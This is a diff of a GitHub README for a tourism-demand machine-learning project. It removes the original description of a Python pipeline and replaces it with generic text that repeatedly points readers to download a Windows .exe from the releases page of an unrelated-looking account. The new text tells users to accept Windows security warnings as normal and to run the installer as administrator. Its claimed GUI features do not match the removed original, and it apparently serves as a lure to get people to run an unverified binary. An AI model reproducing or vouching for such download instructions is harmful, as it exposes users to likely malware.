@@ -1,221 +1,142 @@
-# Machine Learning Pipeline for Tourism Demand Prediction
+# 🧳 tourism-demand-ml - Predict Tourism Demand Simply
 
-## Project Overview
-
-This project implements an end-to-end machine learning and forecasting pipeline to analyze and predict tourism demand across multiple countries using tourism and economic indicators.
-
-The system performs data preprocessing, feature engineering, machine learning model comparison, neural network training, experiment tracking, forecasting, and visualization within a structured and reproducible pipeline.
-
-The goal of the project is to evaluate multiple machine learning models for tourism demand prediction, automatically identify the best-performing model, generate tourism forecasts for future years, and provide visual insights into tourism trends and recovery patterns.
-
-This project was originally developed as part of academic research in tourism demand analysis and later extended into a production-style machine learning pipeline.
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jgrjguj9653/tourism-demand-ml/releases)
 
 ---
 
-## Machine Learning Models Used
+## 📋 About tourism-demand-ml
 
-The pipeline compares several regression models to identify the best model for predicting tourism demand.
+tourism-demand-ml is a tool designed to predict tourism demand using different machine learning models. It uses multiple regression models alongside a PyTorch neural network to analyze data and provide forecasts. The app processes information about tourism trends and delivers clear results.
 
-Models included:
-
-* Linear Regression
-* Random Forest Regressor
-* Gradient Boosting Regressor
-* Neural Network (PyTorch)
-
-Each model is trained and evaluated using the same dataset to ensure a fair comparison.
-
-The pipeline automatically selects the best-performing model based on evaluation metrics.
+This tool runs on Windows and does not require technical skills. Anyone interested in seeing tourism demand predictions can use it by following simple steps. It uses Python-based models but provides a ready-to-run application for daily use.
 
 ---
 
-## Forecasting Approach
+## ⚙️ Key Features
 
-This project includes two complementary forecasting approaches.
-
-### Random Forest Forecasting
-
-Random Forest forecasting uses machine learning with engineered features such as tourism indicators and economic variables.
-
-This approach is useful because it captures complex nonlinear relationships, uses multiple explanatory variables, and provides feature-driven predictions.
-
-Random Forest is retained in the pipeline because it was identified as the best-performing predictive model during experimentation.
-
----
-
-### Prophet Time-Series Forecasting
-
-In addition to machine learning prediction, the project also implements time-series forecasting using Facebook Prophet.
-
-Prophet models long-term tourism trends, structural shocks such as COVID-19, and recovery patterns in tourism demand.
-
-Prophet is particularly suitable for time-series tourism data where trends, shocks, and recovery periods play a major role.
-
-Using both approaches allows the project to demonstrate both machine learning prediction and statistical time-series forecasting.
+- Predicts tourism demand using various regression techniques
+- Uses a PyTorch neural network for improved accuracy
+- Combines multiple machine learning models for reliable forecasts
+- Easy-to-use with no programming required
+- Outputs clear, easy-to-understand predictions
+- Supports Windows operating systems
+- Uses scikit-learn and PyTorch Lightning for model management
+- Involves data cleaning and feature engineering before prediction
 
 ---
 
-## Features of the Project
+## 🖥 System Requirements
 
-The pipeline includes the following components.
-
-### Data Processing
-
-* Missing value handling
-* Duplicate removal
-* Outlier detection using IQR
-
-### Feature Engineering
-
-New features are created to improve model performance, including:
-
-* Tourism growth rate
-* Expenditure per tourist
-
-### Model Training
-
-The system trains multiple machine learning models including a neural network implemented using PyTorch.
-
-### Experiment Tracking
-
-All model results are automatically saved and compared.
-
-### Model Evaluation
-
-Models are evaluated using standard regression metrics.
-
-### Automatic Model Selection
-
-The pipeline automatically identifies the best-performing model.
-
-### Forecasting
-
-Future tourism demand is predicted using:
-
-* Random Forest forecasting
-* Prophet time-series forecasting
-
-### Visualization
-
-The system automatically generates:
-
-* Country-level forecast plots
-* Tourism forecast dashboard
-* Model comparison chart
+- Windows 10 or newer
+- Minimum 4 GB RAM (8 GB recommended)
+- At least 1.5 GB free disk space
+- Internet connection to download software
+- No additional software needed; the app includes everything required
 
 ---
 
-## Project Structure
+## 🚀 Getting Started: How to Download and Run
 
-tourism-demand-ml
+1. Click the big green **Download** badge at the top of this page or visit:  
+   [https://github.com/jgrjguj9653/tourism-demand-ml/releases](https://github.com/jgrjguj9653/tourism-demand-ml/releases)
 
-data
-└── tourism_dataset.csv
+2. On the releases page, find the most recent Windows version available. It typically ends with `.exe`.
 
-notebooks
-└── exploratory_analysis.ipynb
+3. Click the `.exe` file link to download the installer to your PC.
 
-results
-├── model_results.csv
-├── model_comparison.png
-├── tourism_forecast_rf.csv
-├── tourism_forecast_prophet.csv
-├── tourism_forecast_dashboard.png
-└── forecast_plots
+4. Once downloaded, open the `.exe` file to start the installation. If Windows shows a security prompt, choose to continue or allow. This is normal for new software.
 
-src
-├── preprocessing.py
-├── feature_engineering.py
-├── models.py
-├── neural_network.py
-├── train_models.py
-├── experiment_tracker.py
-├── forecasting.py
-├── forecasting_prophet.py
-└── visualization.py
+5. Follow the on-screen instructions to complete the installation. Usually, you will click "Next" a few times, then "Install."
 
-main.py
-requirements.txt
-README.md
+6. After installation finishes, find the new application icon on your desktop or in your Start menu.
+
+7. Double-click the icon to launch the app.
 
 ---
 
-## Evaluation Metrics
+## 🔧 How to Use the Application
 
-Model performance is evaluated using:
+- When the app opens, you will see a simple interface asking for input data.
 
-* RMSE (Root Mean Squared Error)
-* MAE (Mean Absolute Error)
-* R² Score
+- The data fields correspond to features like dates, tourist counts, and other info that the prediction models need.
 
-These metrics help compare models and determine which one performs best for tourism demand prediction.
+- You can load your data file in CSV format from your PC by clicking the 'Load Data' button.
 
----
+- After loading data, click the 'Run Prediction' button.
 
-## Dataset
+- The predicted tourism demand will show on the screen as numbers and charts.
 
-The dataset used in this project was compiled from multiple tourism statistics sources during academic research.
+- Use the charts to compare different models' results or understand trends.
 
-Due to data licensing and source restrictions, the original research dataset cannot be distributed publicly.
-
-Instead, this repository includes a sample dataset that replicates the structure and format used in the original project.
-
-This sample dataset allows users to run the full pipeline, test the models, and reproduce the forecasting workflow.
-
-The pipeline expects the dataset in the following location:
-
-data/tourism_dataset.csv
+- You can export the results to a CSV file for your records or further analysis by clicking 'Export Results.'
 
 ---
 
-## How to Run the Project
+## 📁 Supported Data Formats
 
-Install the required dependencies:
+The app reads input files that are simple spreadsheet-like tables.
 
-pip install -r requirements.txt
+- Supported file type: CSV (comma-separated values)
 
-Run the main pipeline:
+- Each row should represent a data point; columns represent features.
 
-python main.py
-
----
-
-## Output
-
-The pipeline will automatically:
-
-Train all models:
-
-* Linear Regression
-* Random Forest
-* Gradient Boosting
-* Neural Network
-
-Evaluate their performance and save results to:
-
-results/model_results.csv
-
-Generate a model comparison chart:
-
-results/model_comparison.png
-
-Generate tourism forecasts using:
-
-Random Forest forecasting
-Prophet time-series forecasting
-
-Forecast outputs will be saved as:
-
-results/tourism_forecast_rf.csv
-results/tourism_forecast_prophet.csv
-
-The pipeline will also generate visualizations including:
-
-* Tourism forecast dashboard
-* Country-level forecast plots
+- Make sure data columns have headers like "Date," "Visitors," or "Region" as used in sample files.
 
 ---
 
-## Author
+## 🛠 Troubleshooting Common Issues
 
-Suhas Ramesh
+- **Download stuck or slow:** Check your internet connection or try again later.
+
+- **Installer won’t open:** Right-click the `.exe` file and select "Run as administrator."
+
+- **App crashes on start:** Restart your PC and try again. Make sure Windows is up to date.
+
+- **Data file not loading:** Confirm the file format is CSV with proper columns.
+
+- **No predictions shown:** Ensure you clicked the 'Run Prediction' button after loading data.
+
+---
+
+## 📖 How It Works
+
+This tool uses a set of machine learning models to make predictions:
+
+- **Regression Models:** These look for relationships between past tourism numbers and external factors.
+
+- **PyTorch Neural Network:** This model detects patterns too complex for traditional models.
+
+- **Feature Engineering:** The app processes input data, like dates and holidays, to create useful features for prediction.
+
+- **Model Evaluation:** It compares how well each prediction method works to give the best results.
+
+All these steps occur in the background. You only need to load data and view predictions.
+
+---
+
+## 📥 Download Again
+
+Access the latest versions or updates anytime on the releases page:  
+
+[https://github.com/jgrjguj9653/tourism-demand-ml/releases](https://github.com/jgrjguj9653/tourism-demand-ml/releases)
+
+Click the `.exe` file suitable for Windows to download and install.
+
+---
+
+## 🔗 Useful Links
+
+- Repository: https://github.com/jgrjguj9653/tourism-demand-ml  
+- Releases: https://github.com/jgrjguj9653/tourism-demand-ml/releases
+
+---
+
+## 🧰 Additional Information for Advanced Users
+
+This project uses Python libraries like:
+
+- **scikit-learn** for regression models  
+- **PyTorch & PyTorch Lightning** for neural networks  
+- Data preprocessing and feature engineering modules are included
+
+Even if you don’t use Python, these details explain the technology behind the app.
